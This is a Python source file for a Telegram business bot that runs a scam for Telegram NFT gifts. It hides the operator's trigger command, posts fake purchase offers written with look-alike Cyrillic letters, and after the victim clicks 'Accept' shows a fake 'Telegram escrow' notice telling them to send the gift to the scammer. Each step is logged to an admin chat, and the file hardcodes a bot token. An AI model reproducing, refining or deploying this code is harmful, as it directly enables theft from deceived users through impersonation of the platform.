import asyncio
import logging
import random
import re
import string
import uuid
import urllib.request

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest, TelegramForbiddenError
from aiogram.types import (
    Message,
    CallbackQuery,
    BusinessConnection,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.enums import ParseMode

BOT_TOKEN = "8790017360:AAHds4YnUvg-MUXGb61KwSYQ_GwEnv7-M28"

ADMIN_LOG_ID = 8912650144

EMOJI_STARS = "5920433463428650761"
EMOJI_GRAM = "5267445215773367585"
EMOJI_DECLINE_EN = "5774077015388852135"
EMOJI_ACCEPT = "5774022692642492953"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
)
logger = logging.getLogger(__name__)

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)
dp = Dispatcher()

business_owner_ids: dict[str, int] = {}
offers: dict[str, dict] = {}


# ============================================================
# ПАРСИНГ ВЛАДЕЛЬЦА ПОДАРКА (без bs4/aiohttp)
# ============================================================

def _fetch_owner_sync(link: str) -> tuple[str, str]:
    """Синхронно качает HTML и парсит владельца."""
    try:
        req = urllib.request.Request(
            link,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            html = response.read().decode("utf-8", errors="ignore")
    except Exception as e:
        logger.error(f"[owner-parse] fetch failed: {e}")
        return ("unknown", "0")

    # Telegram в og:description пишет типа "Owner: @username"
    # Ищем @username в мета-тегах
    patterns = [
        r'property="og:description"\s+content="([^"]+)"',
        r'property="og:title"\s+content="([^"]+)"',
        r'"owner_username"\s*:\s*"([^"]+)"',
    ]

    for pat in patterns:
        m = re.search(pat, html)
        if m:
            text = m.group(1)
            user_match = re.search(r'@([a-zA-Z0-9_]+)', text)
            if user_match:
                username = user_match.group(1)
                logger.info(f"[owner-parse] link={link} | username=@{username}")
                return (username, "0")

    logger.warning(f"[owner-parse] owner not found in {link}")
    return ("unknown", "0")


async def get_gift_owner(link: str) -> tuple[str, str]:
    """Асинхронная обертка — не блокирует event loop."""
    return await asyncio.to_thread(_fetch_owner_sync, link)


# ============================================================
# ЛОГИРОВАНИЕ ОШИБОК
# ============================================================

def log_telegram_error(prefix: str, e: Exception, **ctx):
    ctx_str = " | ".join(f"{k}={v}" for k, v in ctx.items())

    if isinstance(e, TelegramRetryAfter):
        logger.error(f"[{prefix}] ⏳ FLOOD_WAIT retry_after={e.retry_after}s | {ctx_str}")
        return
    if isinstance(e, TelegramForbiddenError):
        logger.error(f"[{prefix}] 🚫 FORBIDDEN | {ctx_str} | {e}")
        return

    msg = str(e)
    if "PEER_FLOOD" in msg:
        logger.error(f"[{prefix}] 🚨 PEER_FLOOD | {ctx_str} | {msg}")
        return
    if isinstance(e, TelegramBadRequest):
        logger.error(f"[{prefix}] ⚠️ BAD_REQUEST | {ctx_str} | {msg}")
        return

    logger.error(f"[{prefix}] ❓ UNKNOWN | {ctx_str} | {type(e).__name__}: {e}")


# ============================================================
# ОТПРАВКА ЛОГОВ АДМИНУ
# ============================================================

def format_gift_name(slug: str, number: str) -> str:
    formatted_slug = re.sub(r'(?<!^)(?=[A-Z])', ' ', slug)
    return f"{formatted_slug} #{number}"


def get_log_text(data: dict, status: str) -> str:
    status_emoji = "⏳"
    status_text = "Отправлен"
    
    if status == "accepted":
        status_emoji = "✅"
        status_text = "Принят"
    elif status == "declined":
        status_emoji = "❌"
        status_text = "Отклонён"

    gift_name_str = format_gift_name(data['gift_slug'], data['gift_number'])
    gift_display = f'<a href="{data["link"]}"><b>{gift_name_str}</b></a>'

    if data["currency"] == "gram":
        emoji_id = EMOJI_GRAM
        emoji_char = "🪙"
        currency_name = "GRAM"
    else:
        emoji_id = EMOJI_STARS
        emoji_char = "⭐"
        currency_name = "Stars"
        
    emoji_tag = f'<tg-emoji emoji-id="{emoji_id}">{emoji_char}</tg-emoji>'

    return (
        f"<b>Оффер отправлен</b>\n\n"
        f"<b>Подарок:</b> {gift_display}\n"
        f"<b>Сумма:</b> {data['amount']}\n"
        f"<b>Валюта:</b> {emoji_tag} {currency_name}\n"
        f"<b>Отправил:</b> @{data['sender_username']} | {data['sender_id']}\n"
        f"<b>Владелец подарка:</b> @{data['owner_username']} | {data['owner_id']}\n\n"
        f"<b>Статус:</b> {status_emoji} {status_text}"
    )


def get_log_keyboard(data: dict) -> InlineKeyboardMarkup:
    buttons = []
    
    owner_username = data['owner_username']
    owner_id = data['owner_id']
    
    if owner_username and owner_username != "unknown":
        owner_url = f"https://t.me/{owner_username}"
    else:
        owner_url = f"tg://user?id={owner_id}"
        
    buttons.append([
        InlineKeyboardButton(
            text="👤 Владелец",
            url=owner_url
        )
    ])
    
    buttons.append([
        InlineKeyboardButton(
            text="🔗 Ссылка на подарок",
            url=data["link"]
        )
    ])
    
    return InlineKeyboardMarkup(inline_keyboard=buttons)


async def send_log_to_admin(data: dict):
    text = get_log_text(data, "pending")
    keyboard = get_log_keyboard(data)
    
    try:
        msg = await bot.send_message(
            chat_id=ADMIN_LOG_ID,
            text=text,
            reply_markup=keyboard,
            disable_web_page_preview=True,
        )
        data["log_msg_id"] = msg.message_id
    except Exception as e:
        logger.error(f"[admin-log] Не удалось отправить лог: {e}")


async def update_log_message(data: dict, status: str):
    if "log_msg_id" not in data:
        return
        
    text = get_log_text(data, status)
    keyboard = get_log_keyboard(data)

    try:
        await bot.edit_message_text(
            chat_id=ADMIN_LOG_ID,
            message_id=data["log_msg_id"],
            text=text,
            reply_markup=keyboard,
            disable_web_page_preview=True,
        )
    except Exception as e:
        logger.error(f"[admin-log] Не удалось обновить лог: {e}")


# ============================================================
# ПАРСИНГ КОМАНДЫ
# ============================================================

def parse_nft_link(link: str):
    pattern = r"(?:https?://)?t\.me/nft/([A-Za-z]+)-(\d+)"
    m = re.search(pattern, link)
    if not m:
        return None
    slug = m.group(1)
    number = m.group(2)
    full_link = f"https://t.me/nft/{slug}-{number}"
    return full_link, slug, number


def parse_offer_command(text: str):
    parts = text.strip().split()
    if len(parts) < 3 or parts[0].lower() != "truslo":
        return None
    link = parts[1]
    amount = parts[2]
    if not amount.isdigit():
        return None

    currency = "stars"
    if len(parts) > 3:
        p3 = parts[3].lower()
        if p3 in ("stars", "gram"):
            currency = p3

    parsed = parse_nft_link(link)
    if not parsed:
        return None
    full_link, slug, number = parsed

    return {
        "link": full_link,
        "gift_slug": slug,
        "gift_number": number,
        "amount": amount,
        "currency": currency,
    }


# ============================================================
# ОТПРАВКА
# ============================================================

async def send_with_fallback(bc_id, chat_id, text, reply_markup):
    for attempt in range(1, 4):
        try:
            result = await bot.send_message(
                chat_id=chat_id,
                text=text,
                reply_markup=reply_markup,
                business_connection_id=bc_id,
                disable_web_page_preview=False,
            )
            return result
        except TelegramRetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
        except TelegramBadRequest as e:
            if "PEER_FLOOD" in str(e):
                raise
            clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
            if reply_markup:
                for row in reply_markup.inline_keyboard:
                    for btn in row:
                        btn.icon_custom_emoji_id = None
            try:
                return await bot.send_message(
                    chat_id=chat_id,
                    text=clean_text,
                    reply_markup=reply_markup,
                    business_connection_id=bc_id,
                    disable_web_page_preview=False,
                )
            except Exception as e2:
                if attempt == 3:
                    raise


async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
    try:
        await bot.edit_message_text(
            business_connection_id=bc_id,
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            reply_markup=reply_markup,
        )
        return True
    except TelegramBadRequest as e:
        if "message is not modified" in str(e):
            return True
        clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
        if reply_markup:
            for row in reply_markup.inline_keyboard:
                for btn in row:
                    btn.icon_custom_emoji_id = None
        try:
            await bot.edit_message_text(
                business_connection_id=bc_id,
                chat_id=chat_id,
                message_id=message_id,
                text=clean_text,
                reply_markup=reply_markup,
            )
            return True
        except Exception:
            return False


# ============================================================
# ХЭНДЛЕРЫ
# ============================================================

@dp.business_connection()
async def handle_business_connection(connection: BusinessConnection) -> None:
    business_owner_ids[connection.id] = connection.user.id
    logger.info(f"[BC] owner={connection.user.id} connection_id={connection.id}")


@dp.business_message(F.text.regexp(r"(?i)^truslo\s"))
async def handle_offer(message: Message) -> None:
    if not message.business_connection_id:
        return

    bc_id = message.business_connection_id
    data = parse_offer_command(message.text)
    if not data:
        return

    sender_name = "Unknown"
    sender_username = "unknown"
    sender_id = 0
    if message.from_user:
        sender_name = message.from_user.full_name
        sender_username = message.from_user.username or f"id{message.from_user.id}"
        sender_id = message.from_user.id

    # ПАРСИМ ВЛАДЕЛЬЦА ИЗ ССЫЛКИ
    owner_username, owner_id = await get_gift_owner(data["link"])

    try:
        await bot.delete_business_messages(
            business_connection_id=bc_id,
            message_ids=[message.message_id],
        )
    except Exception:
        pass

    await asyncio.sleep(3)

    amount_fmt = f"{int(data['amount']):,}"
    gift_plain = f'{data["gift_slug"]}-{data["gift_number"]}'
    gift_display = f'<a href="{data["link"]}"><b>{gift_plain}</b></a>'

    if data["currency"] == "gram":
        emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
    else:
        emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'

    text = (
        f"Usеr <b>{sender_name}</b> оffеrs уоu "
        f"<b>{amount_fmt}</b> {emoji} "
        f"fоr thе gift {gift_display}.\n\n"
        f"Тhе оffеr ls vаIid fоr <b>6 h. 0 min</b>.."
    )

    offer_id = uuid.uuid4().hex[:12]
    offers[offer_id] = {
        **data,
        "bc_id": bc_id,
        "chat_id": message.chat.id,
        "accepted": False,
        "sender_name": sender_name,
        "sender_username": sender_username,
        "sender_id": sender_id,
        "owner_username": owner_username,
        "owner_id": owner_id,
    }

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Decline",
                    callback_data=f"dec:{offer_id}",
                    icon_custom_emoji_id=EMOJI_DECLINE_EN,
                ),
                InlineKeyboardButton(
                    text="Accept",
                    callback_data=f"acc:{offer_id}",
                    icon_custom_emoji_id=EMOJI_ACCEPT,
                ),
            ]
        ]
    )

    try:
        sent = await send_with_fallback(
            bc_id=bc_id,
            chat_id=message.chat.id,
            text=text,
            reply_markup=keyboard,
        )
        offers[offer_id]["msg_id"] = sent.message_id
        
        # Отправляем лог админу
        await send_log_to_admin(offers[offer_id])

    except Exception as e:
        log_telegram_error("offer-send", e, chat_id=message.chat.id, bc_id=bc_id)


@dp.callback_query(F.data.startswith("dec:"))
async def handle_decline(callback: CallbackQuery) -> None:
    _, offer_id = callback.data.split(":", 1)
    data = offers.get(offer_id)
    if not data or data.get("accepted"):
        try:
            await callback.answer()
        except Exception:
            pass
        return

    try:
        await callback.answer()
    except Exception:
        pass

    await asyncio.sleep(0.3)

    decline_text = (
        f'<tg-emoji emoji-id="{EMOJI_DECLINE_EN}">❌</tg-emoji> '
        f"Offer has been declined."
    )

    await edit_with_fallback(
        bc_id=data["bc_id"],
        chat_id=data["chat_id"],
        message_id=data["msg_id"],
        text=decline_text,
    )
    
    # Обновляем лог админа
    await update_log_message(data, "declined")


@dp.callback_query(F.data.startswith("acc:"))
async def handle_accept(callback: CallbackQuery) -> None:
    _, offer_id = callback.data.split(":", 1)
    data = offers.get(offer_id)
    if not data or data.get("accepted"):
        try:
            await callback.answer()
        except Exception:
            pass
        return

    data["accepted"] = True

    try:
        await callback.answer()
    except Exception:
        pass

    await asyncio.sleep(0.3)

    amount_fmt = f"{int(data['amount']):,}"
    gift_plain = f'{data["gift_slug"]}-{data["gift_number"]}'
    gift_display = f'<a href="{data["link"]}"><b>{gift_plain}</b></a>'

    if data["currency"] == "gram":
        emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
        currency_word_upper = "GRАM"
        currency_word_lower = "GRАM"
    else:
        emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
        currency_word_upper = "Stаrs"
        currency_word_lower = "stаrs"

    rand_suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    order_id = f"ТG-{rand_suffix}"

    buyer_username = data["sender_username"]

    accept_text = (
        f"<b>NFТ Dеаl</b>\n\n"
        f"<b>Оrdеr</b> #{order_id}\n\n"
        f"Тhе buуеr hаs rеsеrvеd <b>{amount_fmt}</b> {emoji} "
        f"thrоugh thе ТеIеgrаm еsсrоw sуstеm. "
        f"Тhе {currency_word_lower} аrе hеId ln а sресiаI еsсrоw ассоunt аnd wlII bе "
        f"аutоmаtiсаIIy сrеditеd tо уоur ТеIеgrаm {currency_word_upper} bаIаnсе "
        f"right аftеr thе gift is trаnsfеrrd.\n\n"
        f"<b>lnstruсtlоns tо соmрlеtе thе dеаl:</b>\n\n"
        f"1. Sеnd tо: @{buyer_username}\n"
        f"2. СIiсk «Sеnd Gift» аnd sеlесt {gift_display}\n"
        f"3. Соnfirm thе glft trаnsfеr.\n\n"
        f"ТеIеgrаm wiII rесоrd thе trаnsасtiоn аnd instаntIу сrеdit "
        f"<b>{amount_fmt}</b> {emoji} tо уоur bаIаnсе. "
        f"Тhе rеsеrvаtiоn is vаlid fоr 24 hоurs."
    )

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Send Gift",
                    url=f"tg://send_gift?to={buyer_username}",
                )
            ]
        ]
    )

    await edit_with_fallback(
        bc_id=data["bc_id"],
        chat_id=data["chat_id"],
        message_id=data["msg_id"],
        text=accept_text,
        reply_markup=keyboard,
    )
        
    # Обновляем лог админа
    await update_log_message(data, "accepted")


async def main() -> None:
    logger.info("Бот запущен...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
